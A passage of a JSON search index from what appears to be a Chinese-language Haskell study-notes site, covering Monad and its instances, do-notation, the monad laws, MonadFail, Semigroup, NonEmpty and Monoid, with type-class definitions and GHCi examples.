(&lt;10), odd]  \n[True,True,True]  \nghci&gt; sequenceA [(&gt;4), (&lt;10), odd] 7  \n[True,True,True]  \n</code></pre></p>"},{"location":"cs/pl/haskell/#monad","title":"Monad","text":"<p>\u5355\u5b50\uff08Monad\uff09\u662f\u5bf9 Applicative Functor \u7684\u6269\u5c55\uff08\u4f46\u662f\u8bde\u751f\u6bd4 Applicative \u65e9\uff09\uff0cFunctor \u7684 <code>&lt;$&gt;</code> \u51fd\u6570\u5b9e\u73b0\u4e86\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff0cApplicative \u7684 <code>&lt;*&gt;</code> \u51fd\u6570\u5c06\u4e0a\u4e0b\u6587\u4e2d\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\u3002\u800c Monad \u63d0\u4f9b\u4e86\u4e00\u4e2a\u51fd\u6570 <code>&gt;&gt;=</code>\uff08bind\uff09\uff0c\u5c06\u4e00\u4e2a\u63a5\u6536\u666e\u901a\u503c\u8fd4\u56de\u4e0a\u4e0b\u6587\u503c\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff1a <pre><code>class Applicative m =&gt; Monad m where\n    (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b\n    (&gt;&gt;) :: m a -&gt; m b -&gt; m b\n    return :: a -&gt; m a\n    m &gt;&gt; n = m &gt;&gt;= \\_ -&gt; n\n    return = pure\n</code></pre></p> <ul> <li><code>return</code> \u51fd\u6570\uff1a\u548c <code>pure</code> \u4e00\u6837\uff0c\u53ea\u662f\u6709\u53e6\u4e00\u4e2a\u540d\u5b57</li> <li><code>&gt;&gt;</code> \u51fd\u6570\uff1a\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u5b83\u7684\u4f5c\u7528\u548c Applicative \u7684 *&gt; \u51fd\u6570\u4e00\u6837</li> <li><code>&gt;&gt;=</code> \u51fd\u6570\uff08bind\uff09\uff1a\u6bd4 Applicative \u5347\u7ea7\u7684\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u63a5\u6536\u503c\u8fd4\u56de\u5355\u5b50\u7684\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u5355\u5b50\u4e2d\u7684\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u65b0\u5355\u5b50</li> </ul>"},{"location":"cs/pl/haskell/#monad_1","title":"Monad \u5b9e\u4f8b","text":""},{"location":"cs/pl/haskell/#maybe_2","title":"Maybe","text":"<p>Maybe \u662f\u4e00\u4e2a\u5355\u5b50\u5b9e\u4f8b\uff0cApplicative \u5df2\u7ecf\u4e3a\u5b83\u5b9e\u73b0\u4e86 return\uff0c\u56e0\u6b64\u53ea\u9700\u8981 &gt;&gt;= \u51fd\u6570\uff1a <pre><code>instance Monad Maybe where\n    (Just x) &gt;&gt;= f = f x \n    Nothing  &gt;&gt;= _ = Nothing\n</code></pre> \u6839\u636e\u5b9a\u4e49\u5c31\u5f88\u5bb9\u6613\u5b9e\u73b0 Maybe \u7684 &gt;&gt;= \u51fd\u6570\u4e86\uff0c\u800c\u4e14\u4e5f\u5f88\u597d\u7406\u89e3 <pre><code>ghci&gt; Just 1 &gt;&gt;= \\x -&gt; Just (x + 1)\nJust 2\nghci&gt; Just 1 &gt;&gt;= \\x -&gt; return (x + 1)\nJust 2\nghci&gt; Nothing &gt;&gt;= \\x -&gt; Just (x + 1)\nNothing\nghci&gt; Just 1 &gt;&gt;= \\x -&gt; Just (x + 1) &gt;&gt; Nothing &gt;&gt;= \\y -&gt; Just (y + 1)\nNothing\n</code></pre> \u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2d\u51fa\u73b0\u4e86 &gt;&gt; Nothing\uff0c\u8fd9\u65f6 Nothing \u524d\u7684\u90e8\u5206\u5168\u90fd\u76f8\u5f53\u4e8e\u6ca1\u7528\uff0c\u56e0\u4e3a &gt;&gt; \u64cd\u4f5c\u7b26\u7684\u5de6\u53f3\u4e24\u8fb9\u53ea\u8981\u6709\u4e00\u4e2a\u51fa\u73b0 Nothing\uff0c\u90a3\u6574\u4f53\u5c31\u4f1a\u662f Nothing\u3002\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u7528\u4e8e\u5728\u4e2d\u9014\u968f\u65f6\u5224\u65ad\u5931\u8bef\uff0c\u53ea\u8981\u6709\u4e00\u5904\u5931\u8bef\uff0c\u7ed3\u679c\u5c31\u4f1a\u662f Nothing</p>"},{"location":"cs/pl/haskell/#_17","title":"[]","text":"<p>\u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff1a <pre><code>instance Monad [] where\n    xs &gt;&gt;= f = concat (map f xs)\n</code></pre> \u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728 xs \u7684\u6bcf\u4e2a\u503c\u4e0a\uff0c\u5c06\u8fd4\u56de\u7684\u6240\u6709\u5217\u8868\u5e73\u94fa\u6210\u4e00\u4e2a\u5217\u8868\uff1a <pre><code>ghci&gt; [3,4,5] &gt;&gt;= \\x -&gt; [x,-x]  \n[3,-3,4,-4,5,-5]  \nghci&gt; [1,2] &gt;&gt;= \\n -&gt; ['a','b'] &gt;&gt;= \\ch -&gt; return (n,ch)  \n[(1,'a'),(1,'b'),(2,'a'),(2,'b')]  \n</code></pre></p>"},{"location":"cs/pl/haskell/#io_3","title":"IO","text":"<p>IO \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u4f46\u662f\u5b9e\u73b0\u65b9\u6cd5\u6bd4\u8f83\u6df1\u5965\uff08\u9003</p>"},{"location":"cs/pl/haskell/#-r_2","title":"(-&gt;) r","text":"<p>(-&gt;) r \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u548c Functor\u3001Applicative \u4e00\u6837\uff0c\u5148\u5206\u6790\u5b83\u7684 &gt;&gt;= \u7c7b\u578b\u7b7e\u540d\uff1a</p> <p>(&gt;&gt;=) :: (-&gt; r) a -&gt; (a -&gt; (-&gt; r) b) -&gt; (-&gt; r) b</p> <p>(&gt;&gt;=) :: (r -&gt; a) -&gt; (a -&gt; r -&gt; b) -&gt; (r -&gt; b)</p> <p>\u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -&gt; a\u3001g :: a -&gt; r -&gt; b\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: r -&gt; b</p> <p>\u90a3\u4e48\u51fd\u6570 h \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b\u4e3a r \u7684\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a b \u7684\u503c\u3002\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528 f \u5f97\u5230\u7c7b\u578b\u4e3a a \u7684\u4e2d\u95f4\u503c\uff0c\u7136\u540e\u518d\u5c06\u8fd9\u4e2a\u503c\u548c\u8f93\u5165\u53c2\u6570\u4e00\u8d77\u4f20\u5165\u51fd\u6570 g \u5f97\u5230\u7ed3\u679c\u3002\u6240\u4ee5\u51fd\u6570 h \u7684\u5b9a\u4e49\u5e94\u8be5\u662f\uff1a</p> <p>\\x -&gt; g (f x) x</p> <p><pre><code>instance Monad ((-&gt;) r) where\n    f &gt;&gt;= g = \\x -&gt; g (f x) x\n</code></pre> <pre><code>ghci&gt; (+3) &gt;&gt;= (+) $ 1\n5\nghci&gt; (+) &lt;$&gt; (+3) &lt;*&gt; id $ 1\n5\n</code></pre></p>"},{"location":"cs/pl/haskell/#do-notation","title":"do-notation","text":"<p>Haskell \u7684 do \u8bed\u53e5\u4e3a\u94fe\u5f0f\u7684 &gt;&gt;= \u5e94\u7528\u63d0\u4f9b\u4e86\u7c7b\u4f3c\u547d\u4ee4\u5f0f\uff08imperative style\uff09\u7684\u8bed\u6cd5\u7cd6\u3002\u6bd4\u5982 <code>a &gt;&gt;= \\x -&gt; b &gt;&gt; c &gt;&gt;= \\y -&gt; d</code>\uff1a <pre><code>a &gt;&gt;= \\x -&gt;\nb &gt;&gt;\nc &gt;&gt;= \\y -&gt;\nd\n</code></pre> \u5176\u4e2d\u6709 abcd \u56db\u4e2a\u503c\uff0c\u53ef\u4ee5\u770b\u51fa a \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 x \u4e0a\uff0cc \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 y \u4e0a\u3002\u4f7f\u7528 do \u8bed\u53e5\u6765\u8868\u793a\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u5199\u6210\uff1a <pre><code>do { x &lt;- a \n   ;      b \n   ; y &lt;- c \n   ;      d \n   }\n</code></pre> \u5176\u4e2d\u7684\u5927\u62ec\u53f7\u548c\u5206\u53f7\u53ef\u4ee5\u7701\u7565\u4e0d\u5199\uff08\u6324\u5728\u4e00\u884c\u65f6\u4e0d\u80fd\u7701\u7565\uff09\u3002do \u8bed\u53e5\u4e5f\u53ea\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u5b83\u53ef\u4ee5\u9012\u5f52\u5730\u8f6c\u6362\u6210\u666e\u901a\u7684 Monad \u64cd\u4f5c\u8bed\u53e5\uff1a</p> <ul> <li><code>do e</code>\uff1ae</li> <li><code>do { e; ... }</code>\uff1ae &gt;&gt; do { ... }</li> <li><code>do { v &lt;- e; ... }</code>\uff1ae &gt;&gt;= \\v -&gt; do { ... }</li> <li><code>do { let ...; ... }</code>\uff1alet ... in do { ... }</li> </ul>"},{"location":"cs/pl/haskell/#applicativedo","title":"ApplicativeDo","text":"<p>\u6bd4\u5982\u5982\u4e0b\u4e00\u4e2a do \u8bed\u53e5\uff1a <pre><code>do x &lt;- a \n   y &lt;- b \n   z &lt;- c \n   return (f x y z)\n</code></pre> \u5b83\u53ef\u4ee5\u8f6c\u5316\u6210\uff1a</p> <p>a &gt;&gt;= \\x -&gt; b &gt;&gt;= \\y -&gt; c &gt;&gt;= \\z -&gt; return (f x y z)</p> <p>\u4f46\u662f\u7ecf\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u6574\u4e2a\u8bed\u53e5\u5b9e\u9645\u4e0a\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u4e86\u4e09\u4e2a\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u4e0a\uff0c\u6240\u4ee5\u4ec5\u7528 Applicative \u7684 &lt;$&gt; \u548c &lt;*&gt; \u5b8c\u5168\u53ef\u4ee5\u5b9e\u73b0\uff1a</p> <p>f &lt;$&gt; a &lt;*&gt; b &lt;*&gt; c</p> <p>\u800c\u4e14\u5728\u8fd0\u884c\u7684\u65f6\u5019 Applicative \u7684\u6548\u7387\u4f1a\u6bd4 Monad \u9ad8\uff0c\u6240\u4ee5 Haskell \u4f1a\u5c06 do \u8bed\u53e5\u5c3d\u53ef\u80fd\u4f18\u5148\u8f6c\u6362\u4e3a Applicative \u7684\u8868\u793a\u65b9\u6cd5\u7136\u540e\u518d\u8ba1\u7b97</p>"},{"location":"cs/pl/haskell/#monad-laws","title":"Monad Laws","text":"<ol> <li><code>Left identity</code>\uff1areturn a &gt;&gt;= k      = k a</li> <li><code>Right identity</code>\uff1am        &gt;&gt;= return = m</li> <li><code>Associativity</code>\uff1a(m &gt;&gt;= g) &gt;&gt;= h      = m &gt;&gt;= (\\x -&gt; g x &gt;&gt;= h)</li> </ol> <p>\u524d\u4e24\u4e2a\u5b9a\u5f8b\u5f88\u597d\u7406\u89e3\uff1a</p> <ul> <li>\u5c06 a \u6ce8\u5165\u4e0a\u4e0b\u6587\u4e4b\u540e\u7ed1\u5b9a\uff08bind\uff09\u7ed9\u51fd\u6570 k(:: a -&gt; m a)\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5c06 a \u76f4\u63a5\u4f20\u5165\u51fd\u6570 k</li> <li>\u5c06\u5df2\u7ecf\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u7ed1\u5b9a\u7ed9 return \u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u4fdd\u6301\u4e0d\u53d8</li> </ul> <p>\u7b2c\u4e09\u4e2a\u5b9a\u5f8b\u662f\u7ed3\u5408\u5f8b\uff0c\u628a\u5b83\u5199\u6210\u66f4\u50cf\u7ed3\u5408\u5f8b\u7684\u8868\u793a\u65b9\u6cd5\u662f\uff1a</p> <p>(m &gt;&gt;= (\\x -&gt; g x)) &gt;&gt;= h <code>=</code> m &gt;&gt;= (\\x -&gt; g x &gt;&gt;= h)</p>"},{"location":"cs/pl/haskell/#_18","title":"\u7ec4\u5408\u8fd0\u7b97\u7b26\uff08&gt;=&gt;\uff09\u5f62\u5f0f","text":"<p><code>Control.Monad</code> \u6a21\u5757\u4e2d\u8fd8\u5b9a\u4e49\u4e86\u51fd\u6570 <code>&gt;=&gt;</code>\uff08Kleisli-composition operator\uff09\uff1a <pre><code>infixr 1 &gt;=&gt;\n(&gt;=&gt;) :: Monad m =&gt; (a -&gt; m b) -&gt; (b -&gt; m c) -&gt; (a -&gt; m c)\nf &gt;=&gt; g = \\x -&gt; f x &gt;&gt;= g\n</code></pre> \u4f7f\u7528 &gt;=&gt; \u8fd0\u7b97\u7b26\u53ef\u4ee5\u5c06\u4e24\u4e2a\u7528\u4e8e\u7ed1\u5b9a\u7684\u51fd\u6570\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u7528\u5b83\u8868\u793a\u7684 Monad \u5b9a\u5f8b\u66f4\u52a0\u6e05\u6670\u76f4\u89c2\uff1a</p> <ol> <li><code>Left identity</code>\uff1areturn &gt;=&gt; f = f</li> <li><code>Right identity</code>\uff1af &gt;=&gt; return = f</li> <li><code>Associativity</code>\uff1a(f &gt;=&gt; g) &gt;=&gt; h = f &gt;=&gt; (g &gt;=&gt; h)</li> </ol>"},{"location":"cs/pl/haskell/#do-notation_1","title":"do-notation \u5f62\u5f0f","text":"<p>Monad \u7684\u8fd9\u4e09\u4e2a\u5b9a\u5f8b\u8fd8\u53ef\u4ee5\u4f7f\u7528 do \u8bed\u53e5\u6765\u63cf\u8ff0\uff1a</p> <ol> <li><code>Left identity</code>\uff1a     <pre><code>do { x' &lt;- return x;\n     f x'             =   do { f x } \n   }\n</code></pre></li> <li><code>Right identity</code>\uff1a     <pre><code>do { x &lt;- m; \n     return x         =   do { m }\n   }\n</code></pre></li> <li><code>Associativity</code>\uff1a     <pre><code>do { y &lt;- do { x &lt;- m;       do { x &lt;- m;              do { x &lt;- m;\n               f x                do { y &lt;- f x;            y &lt;- f x;\n             }           =             g y         =        g y\n     g y                             }                    }\n   }                            }\n</code></pre></li> </ol>"},{"location":"cs/pl/haskell/#intuition_2","title":"Intuition","text":"<p>Monad \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u770b\u6210 Applicative \u7684\u5347\u7ea7\u7248\uff0c\u6bd4\u5982 Applicative \u7684\u64cd\u4f5c\u5168\u90e8\u662f\u56fa\u5b9a\u7684\uff0c\u800c Monad \u7684\u64cd\u4f5c\u53ef\u4ee5\u5728\u4e2d\u9014\u7a81\u7136\u6539\u53d8</p> <p>\u540c\u65f6 Monad \u4e5f\u5b8c\u6210\u4e86 Functor \u548c Applicative \u65e0\u6cd5\u5b8c\u6210\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\u8981\u7528 fmap \u548c\u5b9e\u73b0 &gt;&gt;= \u51fd\u6570\uff08\u5373\u8fbe\u6210\u64cd\u4f5c m a -&gt; (a -&gt; m b) -&gt; m b\uff09\uff0c\u5148\u5047\u8bbe f :: a -&gt; m b\uff0c\u90a3\u4e48 fmap f \u7684\u7c7b\u578b\u5c31\u4f1a\u662f m a -&gt; m (m b)\uff0c\u5c06 m a \u5e94\u7528\u5728 fmap f \u4e0a\u4f1a\u5f97\u5230\u7ed3\u679c m (m b)\uff0c\u800c\u4e0d\u662f m b\u3002\u4f46\u662f\u76ee\u524d\u53ea\u53ef\u4ee5\u4f7f\u7528 pure \u5c06\u4e00\u4e2a\u503c\u88c5\u5165\u4e0a\u4e0b\u6587\u4e2d\uff08a -&gt; m a\uff09\uff0c\u800c\u6ca1\u6709\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u4ece\u4e0a\u4e0b\u6587\u4e2d\u63d0\u53d6\u503c\uff08m a -&gt; a\uff09\u3002\u90a3\u4e48\u5c31\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u64cd\u4f5c\u7684\u6548\u679c\uff08m (m b) -&gt; m b\uff09\u3002\u56e0\u6b64 Monad \u7684\u53e6\u4e00\u4e2a\u7b49\u6548\u7684\u5b9a\u4e49\u65b9\u6cd5\u662f\uff1a <pre><code>class Applicative m =&gt; Monad' m where\n    join :: m (m a) -&gt; m a \n\n    (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b \n    x &gt;&gt;= f = join $ fmap f x\n</code></pre> \u4f46\u662f\u5b9a\u4e49 &gt;&gt;= \u51fd\u6570\u4f1a\u66f4\u4e3a\u76f4\u89c2\u65b9\u4fbf\uff0c\u6240\u4ee5 Haskell \u91c7\u7528\u4e86\u7528 &gt;&gt;= \u51fd\u6570\u5b9a\u4e49 Monad \u7684\u65b9\u6cd5</p> <p>\u540c\u65f6 Haskell \u8fd8\u63d0\u4f9b\u4e86 join \u51fd\u6570\u7684\u5b9a\u4e49\uff1a <pre><code>join :: Monad m =&gt; m (m a) -&gt; m a \njoin x = x &gt;&gt;= id\n</code></pre></p>"},{"location":"cs/pl/haskell/#_19","title":"\u5e38\u7528\u51fd\u6570","text":""},{"location":"cs/pl/haskell/#liftm-ap","title":"liftM &amp; ap","text":"<p>liftM :: Monad m =&gt; (a -&gt; b) -&gt; m a -&gt; m b</p> <p>ap :: Monad m =&gt; m (a -&gt; b) -&gt; m a -&gt; m b</p> <p>\u6240\u4ee5 liftM \u5176\u5b9e\u5c31\u662f fmap\u3001ap \u5c31\u662f &lt;*&gt;\uff0c\u4f46\u662f\u8001\u7248\u672c\u7684 GHC \u5b9a\u4e49 Monad \u5e76\u6ca1\u6709 Functor\u3001Applicative \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e86 liftM\u3001ap\uff0c\u5e76\u4e14\u4fdd\u7559\u4e86\u8fd9\u4e2a\u540d\u5b57</p> <p>\u56e0\u6b64\u4e00\u4e2a\u5355\u5b50\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>pure = return</code>\u3001<code>(&lt;*&gt;) = ap</code> \u76f4\u63a5\u6210\u4e3a\u5e94\u7528\u51fd\u5b50\u7684\u5b9e\u4f8b</p>"},{"location":"cs/pl/haskell/#sequence_1","title":"sequence","text":"<p>sequence :: Monad m =&gt; [m a] -&gt; m [a]</p> <p>sequence \u7684\u4f5c\u7528\u663e\u800c\u6613\u89c1\uff0c\u800c\u4e14\u5728 IO \u90e8\u5206\u4e5f\u4f7f\u7528\u5230\u4e86\u3002\u4f46\u662f\u8fd9\u4e2a\u7248\u672c\u662f\u5728 <code>GHC.Base</code> \u6a21\u5757\u4e2d\u5b9a\u4e49\u7684\uff0c\u8fd8\u6709\u4e00\u4e2a\u66f4\u5e7f\u6cdb\u7684\u4f7f\u7528 Traversable \u7684\u5b9a\u4e49\u5728 <code>Data.Traversable</code> \u6a21\u5757\u4e2d </p>"},{"location":"cs/pl/haskell/#replicatem","title":"replicateM","text":"<p>replicateM :: Applicative m =&gt; Int -&gt; m a -&gt; m [a]</p>"},{"location":"cs/pl/haskell/#mapm-form","title":"mapM &amp; forM","text":"<p>mapM :: Monad m =&gt; (a -&gt; m b) -&gt; [a] -&gt; m [b]</p> <p>forM :: Monad m =&gt; [a] -&gt; (a -&gt; m b) -&gt; m [b]</p> <p>forM \u7684\u7528\u6cd5\u5728 IO \u90e8\u5206\u5df2\u7ecf\u8bf4\u8fc7\uff0cmapM \u548c forM \u90fd\u5728 <code>Data.Traversable</code> \u6a21\u5757\u4e2d\u6709\u5e7f\u6cdb\u7248\u672c</p> <p>\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u51fd\u6570\uff1afilterM\u3001zipWithM\u3001foldM\u3001forever\uff0c\u901a\u8fc7\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u7528\u6cd5\uff0c\u662f\u5c06\u539f\u6765\u4ec5\u4f7f\u7528\u4e0e\u5217\u8868\u7684\u51fd\u6570\u63d0\u5347\u81f3\u53ef\u4ee5\u9002\u7528\u4e8e\u6240\u6709\u5355\u5b50</p> <p>\u5e76\u4e14\u5728\u51fd\u6570\u540d\u540e\u52a0\u4e0b\u5212\u7ebf\uff0c\u6bd4\u5982 sequence_\u3001mapM_\uff0c\u4f1a\u5ffd\u7565\u8fd4\u56de\u503c\uff08\u6700\u7ec8\u7ed3\u679c\u4e3a <code>m ()</code>\uff09</p>"},{"location":"cs/pl/haskell/#_20","title":"=&lt;&lt; &amp; &gt;=&gt; &amp; &lt;=&lt;","text":"<p>\uff08<code>&gt;=&gt;</code> \u64cd\u4f5c\u7b26\u5728\u4e0a\u9762 Monad Laws \u90e8\u5206\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5b9a\u4e49\uff09 - x &gt;&gt;= f = f =&lt;&lt; x  - f &gt;=&gt; g = g &lt;=&lt; f </p>"},{"location":"cs/pl/haskell/#monadfail","title":"MonadFail","text":"<p>MonadFail \u5b9a\u4e49\u5728 <code>Control.Monad.Fail</code> \u6a21\u5757\u4e2d\uff1a <pre><code>class Monad m =&gt; MonadFail m where\n    fail :: String -&gt; m a \n</code></pre> \u5b83\u53ea\u8981\u6c42\u5728 Monad \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0 fail \u51fd\u6570\uff0c\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u4e00\u4e2a\u5355\u5b50\u3002\u8fd9\u4f1a\u4f7f\u5728 do \u8bed\u53e5\u4e2d\u4ea7\u751f\u9519\u8bef\u65f6\u76f4\u63a5\u53d8\u4e3a\u9519\u8bef\u503c\uff08\u7a7a\u503c\uff09\u4f7f\u6700\u7ec8\u7684\u8fd4\u56de\u503c\u4e3a\u9519\u8bef\u503c</p>"},{"location":"cs/pl/haskell/#monadfail_1","title":"MonadFail \u5b9e\u4f8b","text":"<p><pre><code>instance MonadFail Maybe where\n    fail _ = Nothing\n\ninstance MonadFail [] where\n    fail _ = []\n\ninstance MonadFail IO where\n    fail = failIO\n</code></pre> Maybe \u548c [] \u7684 fail \u51fd\u6570\u90fd\u4e0e\u7b2c\u4e00\u4e2a\u53c2\u6570\u65e0\u5173\uff0c\u76f4\u63a5\u8fd4\u56de\u7a7a\u503c\uff08Nothing\u3001[]\uff09\uff1b\u800c IO \u7684 fail \u51fd\u6570\u76f4\u63a5\u4f7f\u7528 failIO\uff0c\u5b9e\u73b0\u65b9\u6cd5\u4e5f\u662f\u6df1\u5965\uff08\u63a5\u7740\u9003 <pre><code>exampleFail :: Maybe Char \nexampleFail = do\n    (x:xs) &lt;- Just \"\"\n    return x \n\nghci&gt; exampleFail\nNothing\n</code></pre> \u5728\u8fd9\u4e2a\u4f8b\u5b50\u7684 do \u8bed\u53e5\u4e2d\uff0c\u5728\u63d0\u53d6 Just \"\" \u4e2d\u7684\u503c\u65f6\u7528\u4e86\u6a21\u5f0f\u5339\u914d\uff0c\u4f46\u662f\u56e0\u4e3a\u5176\u5185\u5bb9\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0cx:xs \u5339\u914d\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u8fd9\u65f6\u5c31\u4f1a\u89e6\u53d1 fail \u51fd\u6570\u76f4\u63a5\u8fd4\u56de Nothing</p>"},{"location":"cs/pl/haskell/#monadfail-law","title":"MonadFail Law","text":"<ul> <li>fail s &gt;&gt;= m = fail s </li> </ul>"},{"location":"cs/pl/haskell/#semigroup","title":"Semigroup","text":"<p>\u534a\u7fa4\uff08semigroup\uff09\u662f\u4e00\u4e2a\u96c6\u5408 \\(S\\)\uff0c\u5b83\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26 \\(\\oplus\\)\uff0c\u5e76\u4e14\u6ee1\u8db3</p> \\[ a\\oplus b \\in S\\quad a, b\\in S \\] <p>\u4ee5\u53ca\u7ed3\u5408\uff08associative\uff09\u5f8b\uff1a</p> \\[ (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c) \\] <p>\u8fd9\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26\u5728 Haskell \u7684 Semigroup \u4e2d\u88ab\u5b9a\u4e49\u4e3a <code>&lt;&gt;</code> \u51fd\u6570\uff1a <pre><code>class Semigroup a where\n    (&lt;&gt;) :: a -&gt; a -&gt; a \n\n    sconcat :: NonEmpty a -&gt; a \n    sconcat (a :| as) = go a as where \n        go b (c:cs) = b &lt;&gt; go c cs \n        go b []     = b\n\n    stimes :: Integarl b =&gt; b -&gt; a -&gt; a \n    stimes = ...\n</code></pre> \u9664\u6b64\u4e4b\u5916\u8fd8\u6709 <code>sconcat</code> \u548c <code>stimes</code> \u51fd\u6570\uff0c\u90fd\u7ed9\u51fa\u4e86\u9ed8\u8ba4\u5b9e\u73b0\u3002\u5bf9\u4e8e\u5217\u8868\uff0c&lt;&gt; \u76f8\u5f53\u4e8e (++)\uff0cstimes \u76f8\u5f53\u4e8e concat . replicate\uff1a <pre><code>ghci&gt; [1, 2] &lt;&gt; [3, 4]\n[1,2,3,4]\nghci&gt; sconcat $ fromList [[1, 2], [3, 4]]\n[1,2,3,4]\nghci&gt; stimes 3 [1, 2]\n[1,2,1,2,1,2]\n</code></pre></p>"},{"location":"cs/pl/haskell/#semigroup-law","title":"Semigroup Law","text":"<ul> <li>(x &lt;&gt; y) &lt;&gt; z = x &lt;&gt; (y &lt;&gt; z)</li> </ul>"},{"location":"cs/pl/haskell/#nonempty","title":"\u8865\uff1aNonEmpty","text":"<p>NonEmpty \u8868\u793a\u975e\u7a7a\u5217\u8868\uff0c\u5b9a\u4e49\u662f\uff1a <pre><code>data NonEmpty a = a :| [a] deriving (Eq, Ord)\n</code></pre> \u4f7f\u7528\u4e00\u4e2a\u5143\u7d20\u548c\u4e00\u4e2a\u5217\u8868\u7528 <code>:|</code> \u8fde\u63a5\u5c31\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a NonEmpty \u7c7b\u578b\u7684\u5217\u8868</p> <p><code>Data.List.NonEmpty</code> \u6a21\u5757\u4e2d\u5b9e\u73b0\u4e86\u5f88\u591a\u666e\u901a\u5217\u8868\u6709\u7684\u51fd\u6570\uff0c\u9700\u8981 qualified import \u540e\u8c03\u7528\uff0c\u4f7f\u7528 fromList\u3001toList \u51fd\u6570\u53ef\u4ee5\u5728\u666e\u901a\u5217\u8868\u548c\u975e\u7a7a\u5217\u8868\u4e4b\u95f4\u8f6c\u6362 <pre><code>ghci&gt; import qualified Data.List.NonEmpty as NE\nghci&gt; arr = NE.fromList [1, 2, 3]\nghci&gt; arr\n1 :| [2,3]\nghci&gt; NE.head arr \n1\nghci&gt; NE.tail arr \n[2,3]\n</code></pre></p>"},{"location":"cs/pl/haskell/#monoid","title":"Monoid","text":"<p>\u5e7a\u534a\u7fa4\uff08Monoid\uff09\u662f\u4e00\u4e2a\u6709\u5355\u4f4d\u5143\u7d20 \\(e\\) \u7684\u534a\u7fa4\uff0c\u5373 \\(e\\) \u6ee1\u8db3\uff1a</p> \\[ e\\oplus x = x\\oplus e = x \\] <p><pre><code>class Semigroup a =&gt; Monoid a where \n    mempty  :: a \n\n    mappend :: a -&gt; a -&gt; a \n    mappend = (&lt;&gt;)\n\n    mconcat :: [a] -&gt; a \n    mconcat = foldr mappend mempty \n</code></pre> \u53ef\u4ee5\u770b\u51fa Monoid \u8981\u6c42\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u6700\u5c11\u53ea\u9700\u8981 <code>mempty</code>\uff0c\u5b83\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8868\u793a\u5355\u4f4d\u5143\u7d20\u3002<code>mappend</code> \u5373 Semigroup \u4e2d\u7684 &lt;&gt; \u8fd0\u7b97\u7b26\uff0c<code>mconcat</code> \u4e5f\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u5b9e\u73b0</p>"},{"location":"cs/pl/haskell/#monoid_1","title":"Monoid \u5b9e\u4f8b","text":""},{"location":"cs/pl/haskell/#a_1","title":"[a]","text":"<p>\u56e0\u4e3a Monoid \u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u50cf Functor \u7b49\u4e00\u6837\u7b49\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6240\u4ee5 [] \u5e76\u4e0d\u662f Monoid \u7684\u5b9e\u4f8b\uff0c\u4f46\u662f\u5177\u4f53\u7c7b\u578b [a] 